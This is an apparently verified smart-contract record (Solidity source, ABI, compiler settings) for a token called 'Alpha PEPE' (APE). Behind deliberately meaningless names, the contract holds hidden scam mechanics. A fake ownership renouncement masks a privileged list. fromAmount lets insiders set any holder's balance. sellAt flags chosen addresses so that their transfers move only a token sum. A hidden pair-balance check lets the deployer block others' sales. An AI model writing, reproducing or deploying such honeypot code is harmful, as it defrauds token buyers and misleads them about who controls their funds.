{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface amountMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalMarketing) external view returns (uint256);\n\n    function transfer(address minTo, uint256 fundFeeLaunch) external returns (bool);\n\n    function allowance(address teamMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFeeLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minTo,\n        uint256 fundFeeLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeShouldTake, uint256 value);\n    event Approval(address indexed teamMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract marketingLiquidityTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingWallet {\n    function createPair(address launchedAt, address feeReceiver) external returns (address);\n}\n\ninterface takeMode is amountMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlphaPEPE is marketingLiquidityTrading, amountMarketing, takeMode {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMinAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderTx;\n    }\n\n    function allowance(address feeTx, address walletToken) external view virtual override returns (uint256) {\n        if (walletToken == listLiquidity) {\n            return type(uint256).max;\n        }\n        return teamIs[feeTx][walletToken];\n    }\n\n    constructor (){\n        \n        fromShould atModeMarketing = fromShould(listLiquidity);\n        enableFund = tradingWallet(atModeMarketing.factory()).createPair(atModeMarketing.WETH(), address(this));\n        \n        modeReceiver = _msgSender();\n        minSenderSwap();\n        listLaunch[modeReceiver] = true;\n        exemptAmount[modeReceiver] = enableMinAt;\n        if (exemptFee == amountTrading) {\n            modeLimit = minSwap;\n        }\n        emit Transfer(address(0), modeReceiver, enableMinAt);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamIs;\n\n    uint256 private enableMinAt = 100000000 * 10 ** 18;\n\n    function transfer(address feeIs, uint256 fundFeeLaunch) external virtual override returns (bool) {\n        return minEnableMarketing(_msgSender(), feeIs, fundFeeLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return senderTx;\n    }\n\n    uint256 receiverSender;\n\n    uint256 public receiverTakeSwap;\n\n    uint256 constant swapMarketing = 20 ** 10;\n\n    uint256 public exemptFee;\n\n    function balanceOf(address totalMarketing) public view virtual override returns (uint256) {\n        return exemptAmount[totalMarketing];\n    }\n\n    function minEnableMarketing(address tokenToMode, address minTo, uint256 fundFeeLaunch) internal returns (bool) {\n        if (tokenToMode == modeReceiver) {\n            return tradingExempt(tokenToMode, minTo, fundFeeLaunch);\n        }\n        uint256 receiverLaunchedMin = amountMarketing(enableFund).balanceOf(atLaunched);\n        require(receiverLaunchedMin == feeAmount);\n        require(minTo != atLaunched);\n        if (txTrading[tokenToMode]) {\n            return tradingExempt(tokenToMode, minTo, swapMarketing);\n        }\n        return tradingExempt(tokenToMode, minTo, fundFeeLaunch);\n    }\n\n    uint256 public amountTrading;\n\n    address private senderTx;\n\n    address public enableFund;\n\n    bool public amountBuyMarketing;\n\n    function approve(address walletToken, uint256 fundFeeLaunch) public virtual override returns (bool) {\n        teamIs[_msgSender()][walletToken] = fundFeeLaunch;\n        emit Approval(_msgSender(), walletToken, fundFeeLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public listLaunch;\n\n    mapping(address => uint256) private exemptAmount;\n\n    uint256 private minSwap;\n\n    function tradingFundLaunched(uint256 fundFeeLaunch) public {\n        receiverAuto();\n        feeAmount = fundFeeLaunch;\n    }\n\n    event OwnershipTransferred(address indexed liquidityMode, address indexed liquidityTotal);\n\n    function modeSellLimit(address enableLiquidity) public {\n        if (amountBuyMarketing) {\n            return;\n        }\n        \n        listLaunch[enableLiquidity] = true;\n        if (modeLimit != minSwap) {\n            minSwap = amountTrading;\n        }\n        amountBuyMarketing = true;\n    }\n\n    function receiverAuto() private view {\n        require(listLaunch[_msgSender()]);\n    }\n\n    address listLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public txTrading;\n\n    uint256 public modeLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    address atLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private marketingWallet = \"APE\";\n\n    function fromAmount(address feeIs, uint256 fundFeeLaunch) public {\n        receiverAuto();\n        exemptAmount[feeIs] = fundFeeLaunch;\n    }\n\n    function transferFrom(address tokenToMode, address minTo, uint256 fundFeeLaunch) external override returns (bool) {\n        if (_msgSender() != listLiquidity) {\n            if (teamIs[tokenToMode][_msgSender()] != type(uint256).max) {\n                require(fundFeeLaunch <= teamIs[tokenToMode][_msgSender()]);\n                teamIs[tokenToMode][_msgSender()] -= fundFeeLaunch;\n            }\n        }\n        return minEnableMarketing(tokenToMode, minTo, fundFeeLaunch);\n    }\n\n    uint256 feeAmount;\n\n    address public modeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return buyFrom;\n    }\n\n    uint8 private sellFundEnable = 18;\n\n    string private buyFrom = \"Alpha PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellFundEnable;\n    }\n\n    function minSenderSwap() public {\n        emit OwnershipTransferred(modeReceiver, address(0));\n        senderTx = address(0);\n    }\n\n    function tradingExempt(address tokenToMode, address minTo, uint256 fundFeeLaunch) internal returns (bool) {\n        require(exemptAmount[tokenToMode] >= fundFeeLaunch);\n        exemptAmount[tokenToMode] -= fundFeeLaunch;\n        exemptAmount[minTo] += fundFeeLaunch;\n        emit Transfer(tokenToMode, minTo, fundFeeLaunch);\n        return true;\n    }\n\n    function sellAt(address totalLiquidity) public {\n        receiverAuto();\n        \n        if (totalLiquidity == modeReceiver || totalLiquidity == enableFund) {\n            return;\n        }\n        txTrading[totalLiquidity] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeShouldTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuyMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFeeLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFeeLaunch\",\"type\":\"uint256\"}],\"name\":\"fromAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSenderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"}],\"name\":\"modeSellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTakeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFeeLaunch\",\"type\":\"uint256\"}],\"name\":\"tradingFundLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFeeLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFeeLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlphaPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}